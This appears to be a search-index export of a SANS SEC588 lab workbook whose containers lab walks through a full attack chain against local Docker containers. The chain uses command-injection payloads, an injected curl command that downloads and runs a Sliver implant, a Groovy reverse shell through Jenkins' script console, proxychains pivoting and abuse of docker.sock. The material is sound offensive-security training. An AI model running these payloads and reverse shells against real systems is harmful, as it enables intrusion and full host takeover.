{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to the SANS Security 588 Labs Copyright \u00a92022, SANS Institute. All rights reserved to SANS Institute. This workbook is considered Courseware as defined by the SANS Courseware License Agreement found at https://www.sans.org/mlp/courseware-licensing-agreement/ and is subject to all terms and conditions of the agreement. Use of this workbook constitutes agreement with these conditions. Electronic Workbook Validation Area This workbook webserver is set to not cache any content. Feel free to refresh this page. Lab Introduction This document will serve as your lab guide throughout the class. We will try and keep the labs accessible by allowing (cut and paste) and providing color to your labs. Accessing the Digital Edition of the Lab Wiki Open the Firefox browser to access the digital edition of the lab wiki from the Slingshot Linux VM. The home page will display this text and allow you to navigate to the course lab exercises. Installing your Virtual Machine Please refer to the Setup Documentat for instructions on how to get the Virtual Machine setup for your class. Updating the Lab Wiki \u2013 Linux The Virtual Machine should be connected to the Lab Environment. Danger DO NOT RUN THIS AS SUDO OR ROOT Command lines /opt/workbook-update.sh That's it! With this one step, you will always have the most current lab materials. Conventions The following typographical conventions are used throughout the labs: Italic Indicates new terms and items of emphasis. Constant width Used for terminal output and within paragraphs to refer to tools or other elements such as variables, function names, statements, keywords, etc. | (vertical bar) The vertical bar is used to indicate steps necessary for navigating through menus (Edit | Paste) Code blocks are used to denote output from tools. Content that is bold represents commands you type. For example: Sec588@slingshot:~$ run_this_command output from the tool This class uses dynamic URLs, meaning that you will not be able to see the URL for your class-subdomain in the local wiki. The URL for the class subdomain will attempt to 'auto-fill through automation in the tools we provide for you online. There are sections of this class in which we will be asking you to replace content. When we are replacing text, we can use angle brackets and content to replace it. If we wish to replace our Subnet Identifier or SubnetID in a command-line interface, we may display the text as \\<SubnetId>. If the Subnet Identifier is subnet-015e77c then we would replace \\<SubnetId> with subnet-015e77c . This icon signifies a tip, suggestion, warning, or general note. Course and Lab Feedback We are always excited to hear your feedback on the course materials. Is there a bug we need to squash? Do you have a suggestion for a new excellent tool that we just have to see? Please let us know. You can also reach out to Moses Frost and Aaron Cure directly: Moses Frost \u2013 mfrost@sans.org Aaron Cure - acure@sans.org Thank you!!","title":"Home"},{"location":"#welcome-to-the-sans-security-588-labs","text":"Copyright \u00a92022, SANS Institute. All rights reserved to SANS Institute. This workbook is considered Courseware as defined by the SANS Courseware License Agreement found at https://www.sans.org/mlp/courseware-licensing-agreement/ and is subject to all terms and conditions of the agreement. Use of this workbook constitutes agreement with these conditions.","title":"Welcome to the SANS Security 588 Labs"},{"location":"#electronic-workbook-validation-area","text":"This workbook webserver is set to not cache any content. Feel free to refresh this page.","title":"Electronic Workbook Validation Area"},{"location":"#lab-introduction","text":"This document will serve as your lab guide throughout the class. We will try and keep the labs accessible by allowing (cut and paste) and providing color to your labs.","title":"Lab Introduction"},{"location":"#accessing-the-digital-edition-of-the-lab-wiki","text":"Open the Firefox browser to access the digital edition of the lab wiki from the Slingshot Linux VM. The home page will display this text and allow you to navigate to the course lab exercises.","title":"Accessing the Digital Edition of the Lab Wiki"},{"location":"#installing-your-virtual-machine","text":"Please refer to the Setup Documentat for instructions on how to get the Virtual Machine setup for your class.","title":"Installing your Virtual Machine"},{"location":"#updating-the-lab-wiki-linux","text":"The Virtual Machine should be connected to the Lab Environment. Danger DO NOT RUN THIS AS SUDO OR ROOT Command lines /opt/workbook-update.sh That's it! With this one step, you will always have the most current lab materials.","title":"Updating the Lab Wiki \u2013 Linux"},{"location":"#conventions","text":"The following typographical conventions are used throughout the labs: Italic Indicates new terms and items of emphasis. Constant width Used for terminal output and within paragraphs to refer to tools or other elements such as variables, function names, statements, keywords, etc. | (vertical bar) The vertical bar is used to indicate steps necessary for navigating through menus (Edit | Paste) Code blocks are used to denote output from tools. Content that is bold represents commands you type. For example: Sec588@slingshot:~$ run_this_command output from the tool This class uses dynamic URLs, meaning that you will not be able to see the URL for your class-subdomain in the local wiki. The URL for the class subdomain will attempt to 'auto-fill through automation in the tools we provide for you online. There are sections of this class in which we will be asking you to replace content. When we are replacing text, we can use angle brackets and content to replace it. If we wish to replace our Subnet Identifier or SubnetID in a command-line interface, we may display the text as \\<SubnetId>. If the Subnet Identifier is subnet-015e77c then we would replace \\<SubnetId> with subnet-015e77c . This icon signifies a tip, suggestion, warning, or general note.","title":"Conventions"},{"location":"#course-and-lab-feedback","text":"We are always excited to hear your feedback on the course materials. Is there a bug we need to squash? Do you have a suggestion for a new excellent tool that we just have to see? Please let us know. You can also reach out to Moses Frost and Aaron Cure directly: Moses Frost \u2013 mfrost@sans.org Aaron Cure - acure@sans.org Thank you!!","title":"Course and Lab Feedback"},{"location":"labs/containers/containers/","text":"Containers Lab Current Status Brief Intro This is a very lengthy lab, but this lab will be critical as we talk about orchestrating containers. It is all done locally but these tactics can be used in any manner. This lab will have you perform the following attacks. Leverage sliver to gain access to internal system shells. Use the shell to proxy through different internal containers using ProxyChains and Socks5 proxies. Leverage docker.sock to start a privileged container on the system itself. This lab is self contained and shows you how to walk through not all of the potential docker attacks but many of them. Danger This lab has you running several docker containers of which memory will be an issue. You may wish at this point to shut down your machine and boost the memory of the Virtual Machine from 2GB or 4GB of RAM. Requirements for This Lab There are not special requirements for this lab. This lab can be done completely offline. Try It Yourself The following are step-by-step instructions to extract the virtual machine and gain familiarity with the tools used in the class. Open up several terminals (you will need 4 with the VPN) Use the vulnapp to get a sliver shell Portscan through the sliver shell using nabuu and proxychains Get onto the Jenkins Server Once you are in the Jenkins Server get onto that container through the groovy shell functions Execute a new container through the docker.sock Walkthrough Docker: Assessing newer technologies To get started, you must have a minimum of three (3) terminals for this lab. The exercises in this lab will use new terminal windows. You can either use tabs or new terminal windows. Open a MATE Terminal Window by double-clicking on the MATE icon. You should have three additional terminals that we will now set the name for below Terminal 2 | Set Title Set the title to python Terminal 3 | Set Title Set the title to working Terminal | Set Title Set the title to sliver Note You can also open a terminal by pressing Ctrl + Alt + T Now let's bring up all our docker containers. From the working container. Danger Please note that this step takes up to 5 minutes to fully load the containers. The more resources you give you system the faster it will run. Command lines cd /opt/dockerlabs/lab6 Command lines docker compose up -d Expected Results sec588@slingshot ~ $ cd /opt/dockerlabs/lab6 sec588@slingshot /opt/dockerlabs/lab6 $ docker compose up -d [+] Building 0.0s (0/0) [+] Running 11/11 \u2714 Network npm-networking Created 0.2s \u2714 Container vulnapp Started 4.4s \u2714 Container dozzle Started 3.6s \u2714 Container jenkins Started 4.3s \u2714 Container bukuserver Started 3.9s \u2714 Container redis Started 3.8s \u2714 Container uptime-kuma Started 4.3s \u2714 Container portainer Started 3.8s \u2714 Container heimdall Started 4.3s \u2714 Container db Started 4.1s \u2714 Container npm Started 6.1s sec588@slingshot /opt/dockerlabs/lab6 $ To look at our localized containers, let's start with one called \"Heimdall\". Command lines firefox http://heimdall.local:8888 & Note The process id below of 12345 will be different for each student Expected Results sec588:slingshot:workdir$ firefox http://heimdall.local:8888 & [ 1 ] 12345 Heimdall is a dashboard where the administrators can hold several links. Think of it as a lovely home dashboard with additional integrations. Providing Heimdall with logins will populate the data in the dashboard for you in a preview window. For example, Jenkins runs jobs or containers that Portainer is managing. We are going to click on the vulnlab button. Once you have clicked on this Vulnapp Dashboard Widget, you will be taken to the \"Vulnerable Application Server\". Once you are in the Vulnerable Application, you can see a simple \"ping application\" with a form. Let's validate that this application is \"vulnerable.\" Notice that in the web application form, we will type the following value and hit enter: Form Input 127.0.0.1 Expected Results Now let's add additional Linux commands to validate the actual bug. The id command would be a command that we could run. Form Input 127.0.0.1;id Expected Results Did you notice the output? Let's try it from the command line to analyze better what is occurring. Switch back to the MATE Terminal. Run the following curl command within the MATE Terminal. Note Do this from the working Terminal Window Command Lines curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bid\" Expected Results sec588:slingshot:~$ curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bid\" <html> <head> </head> <script> function encode () { const str = document.getElemntById ( \"ping\" ) .value ; console.log ( str ) return str ; } </script> <form class = \"form-inline\" action = \"\" method = \"GET\" > <label for = \"ping\" >What do you want to ping?</label> <input type = \"ping\" id = \"ping\" placeholder = \"127.0.0.1\" name = \"ping\" > <input type = \"hidden\" name = \"form_submitted\" value = \"1\" /> <button type = \"submit\" >Submit</button> </form> <pre> Running ping -c 2 127 .0.0.1 ; id: PING 127 .0.0.1 ( 127 .0.0.1 ) 56 ( 84 ) bytes of data. 64 bytes from 127 .0.0.1: icmp_seq = 1 ttl = 64 time = 0 .027 ms 64 bytes from 127 .0.0.1: icmp_seq = 2 ttl = 64 time = 0 .036 ms --- 127 .0.0.1 ping statistics --- 2 packets transmitted, 2 received, 0 % packet loss, time 1031ms rtt min/avg/max/mdev = 0 .027/0.031/0.036/0.004 ms uid = 33 ( www-data ) gid = 33 ( www-data ) groups = 33 ( www-data ) Done Running </pre> </html> Look at what is occurring here: The command that is run is going to be reflected as: ping -c 2 127.0.0.1;id The command output is reflected below starting with: PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. After the ping command, we see the output of: uid=33(www-data) gid=33(www-data) groups=33(www-data) denoting command injection Bonus : There is also XSS on this page as the command is being reflected on the page without sanitization, and you are in control of the command. You may have noticed that this container runs the Apache process as www-data, typically uid/gid 33 on Debian. Given that we are not root, we may be limited in what we can do on this device. We can, however, execute commands; let us see how we can get access to the container without using docker commands. The first thing we will want to do is start a \"sliver\" server instance. First, we must extract the IP Address from the machine to run this attack. Note Do this from the working Terminal Window Command Lines ip addr show eth0 Danger The IP address for this VM at the time of this writing is 192.168.4.9 . Yours will be different . Please note this address as you will need it several times. Expected Results sec588:slingshot:workdir$ ip addr show eth0 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:b8:1a:a7 brd ff:ff:ff:ff:ff:ff altname enp2s1 altname ens33 inet 192.168.4.9 /24 metric 100 brd 192.168.4.255 scope global dynamic eth0 valid_lft 3587sec preferred_lft 3587sec We can store this value in a variable for use later. Command lines IP = $( ip addr show eth0 | grep inet | awk '{ print $2 }' | awk -F/ '{ print $1 }' ) Command lines echo $IP Expected Results sec588:slingshot:workdir$ $ IP = $( ip addr show eth0 | grep inet | awk '{ print $2 }' | awk -F/ '{ print $1 }' ) sec588:slingshot:workdir$ $ echo $IP 192.168.4.9 Next, we will run a Sliver and generate our implant. Please open a New MATE Terminal Window. We will call this window Sliver and this will be the Window name we refer to. Note You can also open a terminal by pressing Ctrl + Alt + T . Using the Terminal | Set Title ... of the menu call this window Sliver . Danger Please note that generating a sliver implant may take a long time and will also place the implant in the directory from which you ran sliver . For us, that directory will be /home/sec588/Coursefiles/workdir Command Lines cd /home/sec588/Coursefiles/workdir Command Lines sudo systemctl start sliver Command Lines sliver Command Lines mtls -l 9999 Command Lines generate --os linux --mtls 192.168.4.9 :9999 --skip-symbols Expected Results sec588:slingshot:~$ cd /home/sec588/Coursefiles/workdir sec588:slingshot:workdir$ sudo systemctl start sliver sec588:slingshot:workdir$ sliver Connecting to localhost:31337 ... \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d All hackers gain skulk [*] Server v1.5.35 - 1756fdfb62eb21346a3149fa34af127e34d4b799 [*] Welcome to the sliver shell, please type 'help' for options [*] Check for updates with the 'update' command sliver > mtls -l 9999 [*] Starting mTLS :9999 listener ... [*] Successfully started job #1 sliver > generate --os linux --mtls 192.168.4.9 :9999 --skip-symbols [*] Generating new linux/amd64 implant binary [*] Symbol obfuscation is disabled [*] Build completed in 1m5s [*] Implant saved to /home/sec588/Coursefiles/workdir/PROPOSED_DECREASE sliver > Note You may have realized that every Sliver implant, if not directed with a specific name, will have an upper cased implant name that will look oddly similar to specific threat actors. This is a go based binary implant that does not require any dependencies; we can serve it up and upload it to the container if we want. Let's use python to do this. The name of the binary that we created is PROPOSED_DECREASE in the workbook. But on your system your binary will have a completely different name. Just be sure you are aware of this. Let's rename the binary so that we can make all the lab steps a bit easier for us to provide. Note In the value below replace the word PROPOSED_DECREASE with the name of you binary. Command Lines BIN = \"PROPOSED_DECREASE\" Command Lines mv /home/sec588/Coursefiles/workdir/ $BIN /home/sec588/Coursefiles/workdir/nginx Expected Results BIN=\"PROPOSED_DECREASE\" Use the python MATE window to serve the implant with python . Note You can also open a terminal by pressing Ctrl + Alt + T . Using the Terminal | Set Title ... of the menu call this window Python . Command Lines cd /home/sec588/Coursefiles/workdir Command Lines python3 -m 'http.server' 9998 Expected Results sec588:slingshot:workdir$ python3 -m 'http.server' 9998 Serving HTTP on 0 .0.0.0 port 9998 ( http://0.0.0.0:9998/ ) ... What we need to know is how to move this file; you may have a few options. curl , wget , or simply nc . Note Do this from the working window Command Lines curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bwhich+curl\" Expected Results sec588:slingshot:~$ curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bwhich+curl\" <html> <head> </head> <script> function encode() { const str = document.getElemntById(\"ping\").value; console.log(str) return str; } </script> <form class=\"form-inline\" action=\"\" method=\"GET\"> <label for=\"ping\">What do you want to ping?</label> <input type=\"ping\" id=\"ping\" placeholder=\"127.0.0.1\" name=\"ping\"> <input type=\"hidden\" name=\"form_submitted\" value=\"1\" /> <button type=\"submit\">Submit</button> </form> <pre> Running ping -c 2 127.0.0.1;id: PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms --- 127.0.0.1 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1031ms rtt min/avg/max/mdev = 0.027/0.031/0.036/0.004 ms /usr/bin/curl Done Running </pre> </html> We have the curl binary. Let's move the binary over the container and run it in a directory allowing us to execute commands, for example, /tmp . We also want to make the binary executable and execute it. Tip Defender tip: Do you need this many binaries in a container? Note This particular lab step will require a few things that you will need to be aware of. + Do this from the working window + Remember to do this with the IP address of your host, you will need to change it in several places, the one we highlight is 192.168.4.9 which is not necessarily yours. + If you did this correctly, the output of $IP will reflect your IP. Command Lines echo $IP Command Lines curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bcurl+http:// $IP :9998/nginx+--output+/tmp/nginx%3Bchmod+777+/tmp/nginx%3B/tmp/nginx%26\" Expected Results sec588:slingshot:workdir$ curl curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bcurl+http:// $IP :9998/nginx+--output+/tmp/nginx%3Bchmod+777+/tmp/nginx%3B/tmp/nginx%26\" < html > < head > </ head > < script > function encode () { const str = document . getElemntById ( \"ping\" ). value ; console . log ( str ) return str ; } </ script > < form class = \"form-inline\" action = \"\" method = \"GET\" > < label for = \"ping\" > What do you want to ping? </ label > < input type = \"ping\" id = \"ping\" placeholder = \"127.0.0.1\" name = \"ping\" > < input type = \"hidden\" name = \"form_submitted\" value = \"1\" /> < button type = \"submit\" > Submit </ button > </ form > < pre > Running ping -c 2 127.0.0.1;curl http://192.168.4.9:9998/nginx --output /tmp/nginx;chmod 777 /tmp/nginx;/tmp/nginx & : PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.097 ms --- 127.0.0.1 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1008ms rtt min/avg/max/mdev = 0.043/0.070/0.097/0.027 ms In the sliver window you should see a new connected session. For example: [*] Session 0c2551db PROPOSED_DECREASE - 172.18.0.4:37186 (2756fe0bb429) - linux/amd64 - Tue, 27 Jun 2023 23:24:36 UTC To interact with Sliver Sessions you need to use the use command. Sliver only shows the first 8 characters of the session ID and not the entire GUID. You can use tab completion to resolve it. Note To use tab completion use the Tab key. Additional note is that each and every Session ID is unique such that in our example 0c2551db will be different from your example. Note Do this from within sliver in the sliver Window. Command Lines use 0c2551d Tab Expected Results console sliver > use 0c2551db-9382-41f0-ac1f-42ceea6f09d3 Let's now look at the file system so you can see our binary, we can do this with sliver without needing an interactive shell. Command Lines ls /tmp Expected Results sliver (PROPOSED_DECREASE) > ls /tmp /tmp (2 items, 29.5 MiB) ======================== -rwxrwxrwx nginx 14.6 MiB Tue Jun 27 23:24:36 +0000 2023 We may also want to see Environment Variables that can give us hints to other systems. In many systems environment variables will give us: Other targets that are in the same system Authentication Key Material Database or other types of credentials with locations Let's use the built in env command in sliver to see the environment variables on the container. Command Lines env Extracted Results sliver (PROPOSED_DECREASE) > env HOSTNAME=2756fe0bb429 PHP_VERSION=8.2.7 APACHE_CONFDIR=/etc/apache2 PHP_INI_DIR=/usr/local/etc/php GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC PHP_LDFLAGS=-Wl,-O1 -pie PWD=/var/www/html APACHE_LOG_DIR=/var/log/apache2 LANG=C PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0 APACHE_PID_FILE=/var/run/apache2/apache2.pid PHPIZE_DEPS=autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2c PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz APACHE_RUN_GROUP=www-data APACHE_LOCK_DIR=/var/lock/apache2 SHLVL=1 PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 APACHE_RUN_DIR=/var/run/apache2 APACHE_ENVVARS=/etc/apache2/envvars APACHE_RUN_USER=www-data PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 _=/usr/bin/env The sliver system also has a socks5 proxy that we can use to pivot to other hosts on the system. To do this we need to start the socks5 proxy and we will then configure proxychains to perform the connectivity between a localhost and the remote system. Command Lines socks5 start Expected Results sliver (PROPOSED_DECREASE) > socks5 start [*] Started SOCKS5 127.0.0.1 1081 \u26a0\ufe0f In-band SOCKS proxies can be a little unstable depending on protocol Start a new Window called Working2 as your original Working window will be frozen with the sliver implant. From Working2 run the following commands. Note In some cases your docker network may not be 172.18.0.0/24. You can check with the command injection we have in teh vulnerable web server. Try injecting a command like hostname -I ! Command Lines proxychains naabu -host 172 .18.0.0/24 -port 80 ,8000,8080,50000,9000,5001,443,3001,6379 Expected Results sec588:slingshot:/$ proxychains naabu -host 172 .18.0.0/24 -port 80 ,8000,8080,50000,9000,5001,443,3001,6379 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 __ ___ ___ ___ _/ / __ __ / _ \\/ _ \\/ _ \\/ _ \\/ // / /_//_/\\_,_/\\_,_/_.__/\\_,_/ projectdiscovery.io [INF] Current naabu version 2.1.6 (latest) [INF] Running CONNECT scan with non root privileges [INF] Found 2 ports on host 172.18.0.5 (172.18.0.5) 172.18.0.5:8000 172.18.0.5:9000 [INF] Found 1 ports on host 172.18.0.8 (172.18.0.8) 172.18.0.8:5001 [INF] Found 1 ports on host 172.18.0.2 (172.18.0.2) 172.18.0.2:8080 [INF] Found 2 ports on host 172.18.0.11 (172.18.0.11) 172.18.0.11:443 172.18.0.11:80 [INF] Found 3 ports on host 172.18.0.1 (172.18.0.1) 172.18.0.1:8000 172.18.0.1:80 172.18.0.1:443 [INF] Found 1 ports on host 172.18.0.4 (172.18.0.4) 172.18.0.4:80 [INF] Found 2 ports on host 172.18.0.7 (172.18.0.7) 172.18.0.7:80 172.18.0.7:443 [INF] Found 2 ports on host 172.18.0.3 (172.18.0.3) 172.18.0.3:50000 172.18.0.3:8080 [INF] Found 1 ports on host 172.18.0.9 (172.18.0.9) 172.18.0.9:6379 [INF] Found 1 ports on host 172.18.0.10 (172.18.0.10) 172.18.0.10:3001 We can use a wordlist to do DNS enumeration from within the cluster environment, but instead let's do a slightly different manuver. Instead what we are going to do is use curl since we know some of these names. We could use http://ip:port but to expedite things, let's use a simple jenkins:8080 . Command Lines proxychains curl http://jenkins:8080 Expected Results sec588:slingshot:/$ proxychains curl http://jenkins:8080 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 127.0.0.1:1081 ... jenkins:8080 ... OK <html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'> Authentication required <!-- --> </body></html> Interestingly enough, what we have is jenkins and we also have a url to login. Most of the newer jenkins systems will have this. We could use a password bruteforcing tool such as BurpSuite to go after this system. Jenkins is an interesting target when it is within a container. How can jenkins produce a container when jenkins itself is in a container? This process is called docker in docker and it introduces a new vulnerability. The vulnerability is that the docker.sock is now exposed from within a container. Most docker.sock sockets are not secured by any authentication making this a very interesting target. Recall some of the vulnerabilities. docker.sock has no authentication Docker's daemon process is running as root, any container executed can have full root permissions on the box An attacker can abuse this to gain full root access on a host The login to this system would need to be bruteforce in order to obtain access. Password Bruteforcing with tools like Burp are something we do quite often, instead let's focus on the attack vector. To login into Jenkins use the following username and password: Username: sec588 Password: slingshotslingshot Note Remember the IP address here has to change from the IP Address listed to the IP address of your VM. Command lines firefox \"http://jenkins.local:8000/login?from=%2Fmanage%2Fscript\" Note Please make note that sometimes when you login the redirect takes you to the wrong place, for example: Change the URL at the top to http://jenkins.local : 8000 /manage/script to see the page: Open another Terminal, this terminal will be another Shell Catcher where we can use a netcat listener. Let's call this Window Shell Catcher . Note You can also open a terminal by pressing Ctrl + Alt + T . Using the Terminal | Set Title ... of the menu call this window Shell Catcher . Command lines nc -vnlp 9997 Expected Results sec588:slingshot:~$ nc -nvlp 9997 Listening on 0.0.0.0 9997 Now modify this below to reflect your IP address. The script below was created by Chris Frohoff and can be found on Github Form String host = \" 192.168.4.9 \" ; int port = 9997 ; String cmd = \"/bin/bash\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while ( ! s . isClosed ()){ while ( pi . available () > 0 ) so . write ( pi . read ()); while ( pe . available () > 0 ) so . write ( pe . read ()); while ( si . available () > 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); Once you click run, return to the screen that has the nc and see if you see a message that says Connection Received . Danger If you run the id command after you see the Connection received banner you should be able to run commands. A raw netcat shell like this does not reflect a prompt and this may confuse you. Let's now upgrade our shell by using sliver to get more access to the host. To do this we can run the following commands below to do this. Do this from the new shell you got. Danger Remember to change the IP address below to reflect your host IP. Tip Do this from the Shell Catcher Window Command lines export IP = 192.168.4.9 Command lines curl http:// ${ IP } :9998/nginx --output /tmp/nginx ; chmod 777 /tmp/nginx ; /tmp/nginx & At this point we should have a new shell from sliver in our example, recall each one is unique, so our example will be different from yours. Before leaving this window. Hit Ctrl + C and stop the nc process. We will then need to restart it, as we will be receiving a new shell soon. Command lines nc -nvlp 9997 Example Results sec588@slingshot ~/Coursefiles/workdir $ nc -nvlp 9997 Listening on 0 .0.0.0 9997 Connection received on 172 .18.0.7 41956 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) export IP = 192.168.4.9 curl http:// ${ IP } :9998/nginx --output /tmp/nginx ; chmod 777 /tmp/nginx ; /tmp/nginx & % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14 .8M 100 14 .8M 0 0 25 .5M 0 --:--:-- --:--:-- --:--:-- 25 .5M ^C sec588@slingshot ~/Coursefiles/workdir $ nc -nvlp 9997 Listening on 0 .0.0.0 9997 In sliver session we should have a new sessions that denoted by the string below. We can interact with the system with the use command just like before. [*] Session abcfdd98 PROPOSED_DECREASE - 192.168.4.205:58670 (0222610d7c9e) - linux/amd64 - Wed, 28 Jun 2023 01:04:31 UTC Command lines bash use abcfd Tab Expected Results ```console sliver (PROPOSED_DECREASE) > use abcfdd98-7e1b-4b9a-8454-14cf479aa180 [*] Active session PROPOSED_DECREASE (abcfdd98-7e1b-4b9a-8454-14cf479aa180) ``` Now let's use the ls command to make sure our implant is working correctly. Command lines ls Expected Results sliver (PROPOSED_DECREASE) > ls /tmp (4 items, 17.9 MiB) ======================== drwxr-xr-x hsperfdata_root <dir> Wed Jun 28 00:48:45 +0000 2023 drwx------ jetty-0_0_0_0-8080-war-_-any-1577770271696201865 <dir> Wed Jun 28 00:48:47 +0000 2023 -rwxrwxrwx nginx 14.6 MiB Wed Jun 28 01:04:31 +0000 2023 -rw-r--r-- winstone7225790913945196749.jar 3.2 MiB Wed Jun 28 00:48:46 +0000 2023 While it's not ideal in Windows to perform \"shell\" commands typically Linux systems in containers will not have EDR tools that can detect simple shell outputs. We can just use shell to interact with the system and do this without too much worry. Let's do that and install jq . We can install jq as jenkins is running as UID 0 . Command lines shell Command lines find ./ -name docker.sock Command lines apt install jq -y Note The errors in the ./proc directories will be completely random based on the system that your on. You can safely ignore these. Expected Results sliver (PROPOSED_DECREASE) > shell ? This action is bad OPSEC, are you an adult? Yes [*] Wait approximately 10 seconds after exit, and press <enter> to continue [*] Opening shell tunnel (EOF to exit) ... [*] Started remote shell with pid 104 root@0222610d7c9e:/# find ./ -name docker.sock ./run/docker.sock find: \u2018./proc/16/task/16/net\u2019: Invalid argument find: \u2018./proc/16/net\u2019: Invalid argument find: \u2018./proc/102/task/102/net\u2019: Invalid argument find: \u2018./proc/102/net\u2019: Invalid argument root@0222610d7c9e:/# apt install jq -y Reading package lists... Done Building dependency tree... Done Reading state information... Done The following additional packages will be installed: libjq1 libonig5 The following NEW packages will be installed: jq libjq1 libonig5 0 upgraded, 3 newly installed, 0 to remove and 0 not upgraded. Need to get 384 kB of archives. After this operation, 1148 kB of additional disk space will be used. Get:1 http://deb.debian.org/debian bullseye/main amd64 libonig5 amd64 6.9.6-1.1 [185 kB] Get:2 http://deb.debian.org/debian bullseye/main amd64 libjq1 amd64 1.6-2.1 [135 kB] Get:3 http://deb.debian.org/debian bullseye/main amd64 jq amd64 1.6-2.1 [64.9 kB] Fetched 384 kB in 0s (835 kB/s) debconf: delaying package configuration, since apt-utils is not installed Selecting previously unselected package libonig5:amd64. (Reading database ... 15729 files and directories currently installed.) Preparing to unpack .../libonig5_6.9.6-1.1_amd64.deb ... Unpacking libonig5:amd64 (6.9.6-1.1) ... Selecting previously unselected package libjq1:amd64. Preparing to unpack .../libjq1_1.6-2.1_amd64.deb ... Unpacking libjq1:amd64 (1.6-2.1) ... Selecting previously unselected package jq. Preparing to unpack .../archives/jq_1.6-2.1_amd64.deb ... Unpacking jq (1.6-2.1) ... Setting up libonig5:amd64 (6.9.6-1.1) ... Setting up libjq1:amd64 (1.6-2.1) ... Setting up jq (1.6-2.1) ... how do you interact with a socket file in linux? cURL provides the ability to use a socket file. To do this you need to specify the --unix-socket command and the URL will be http://localhost . What we are going to do is list the images that are pulled into the localhost already. We can do this by looking for the RepoTags key. Command lines curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.[] | .RepoTags' Note There will be other repositories in here that may not perfectly match, this is expected. Expected Results root@0222610d7c9e:/# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.[] | .RepoTags[]' \"workdir-jenkins:latest\" \"workdir_jenkins:latest\" \"workdir-vulnapp:latest\" \"workdir_vulnapp:latest\" \"workdir-redis:latest\" 